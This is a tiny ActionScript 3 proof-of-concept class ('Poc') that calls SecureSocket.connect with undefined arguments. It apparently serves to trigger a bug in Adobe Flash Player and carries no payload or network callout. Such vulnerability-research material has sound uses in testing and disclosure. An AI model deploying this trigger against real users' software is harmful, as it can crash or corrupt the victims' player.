package
{
	/**
	* 
	* @author bo13oy
	*
	*/
	import flash.display.Sprite;
	import flash.net.SecureSocket;
	public class Poc extends Sprite
	{
	      public function Poc()
	      {
			var socket:SecureSocket =  new SecureSocket();
			socket.connect(undefined,undefined);
	      }
	}
}
